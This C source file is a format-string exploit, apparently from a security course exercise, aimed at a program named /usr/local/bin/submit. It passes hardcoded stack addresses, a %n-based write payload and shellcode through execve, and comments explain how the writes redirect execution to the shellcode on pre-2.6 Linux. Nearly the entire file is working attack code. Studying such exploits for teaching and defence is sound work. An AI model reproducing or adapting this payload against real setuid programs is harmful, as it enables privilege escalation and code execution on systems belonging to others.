/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"
#define NAME "\x0c\xde\xbf\xff\x0e\xde\xbf\xff" // little-endian representation of
                                                // memory location where the hack resides
                                                // because hack is used on pre-2.6 linux

#define HACK "%105$.57272x%105$hn%105$.8199u%106$hn     " // write the 105th address up the stack
                                                          // with 57272 characters of padding 
                                                          // then the number of characters printed
                                                          // to the address pointed to by the 105th address
                                                          // repeat with 106th address up the stack to jump
                                                          // to the shellcode
int main(void)
{
  char *args[4];
  char *env[1];
  args[0] = NAME;
  args[1] = HACK;
  args[2] = shellcode;
  args[3] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
